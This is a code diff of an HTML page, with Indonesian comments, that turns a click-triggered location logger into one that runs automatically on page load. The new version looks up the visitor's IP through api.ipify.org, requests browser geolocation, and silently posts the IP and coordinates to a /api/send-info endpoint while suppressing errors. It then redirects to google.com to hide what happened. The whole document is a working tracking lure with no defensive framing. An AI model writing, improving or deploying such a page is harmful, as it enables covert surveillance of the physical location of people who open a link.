@@ -1,34 +1,52 @@
 <!DOCTYPE html>
 <html>
-<body onclick="start()">
-
+<head>
+  <meta charset="utf-8" />
+</head>
+<body>
 <script>
-  function sendLocation(lat, lon) {
-    fetch("/api/send", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ lat, lon })
-    }).then(() => {
-      window.location.href = "https://google.com";
-    });
+  async function sendData() {
+    let ip = null;
+
+    // ambil IP
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      ip = data.ip;
+    } catch {}
+
+    let latitude = null;
+    let longitude = null;
+
+    // ambil lokasi (popup browser otomatis muncul)
+    if (navigator.geolocation) {
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        latitude = position.coords.latitude;
+        longitude = position.coords.longitude;
+      } catch {}
+    }
+
+    try {
+      await fetch("/api/send-info", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          ip,
+          latitude,
+          longitude
+        })
+      });
+    } catch {}
+
+    window.location.href = "https://www.google.com";
   }
 
-  function start() {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        sendLocation(pos.coords.latitude, pos.coords.longitude);
-      },
-      () => {
-        window.location.href = "https://google.com";
-      }
-    );
-  }
-
-  /
-  start();
+  sendData();
 </script>
-
 </body>
 </html>
